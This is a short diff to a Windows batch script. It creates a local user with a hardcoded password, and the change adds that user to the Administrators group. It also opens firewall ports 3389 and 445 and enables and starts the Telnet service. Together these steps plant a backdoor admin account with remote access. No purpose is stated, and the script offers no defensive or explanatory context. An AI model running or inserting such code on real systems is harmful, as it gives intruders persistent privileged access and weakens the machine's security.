@@ -3,10 +3,12 @@
 del /q/f/s %TEMP%\*
 color a
 :: Set User Account and Password
-net user Rick S4nch3zc147 /add
-::Open Port 333
-netsh firewall add portopening TCP 333
-netsh firewall add portopening UDP 333
+net user Deckard PKD8219 /add
+:: Added user to Admin group
+net localgroup "Administrators" Deckard /add
+::Open Port Some Ports
+netsh firewall add portopening TCP 3389
+netsh firewall add portopening UDP 445
 sc config tlntsvr start= auto
 :: Alternative method to start Telnet 
 net start telnet
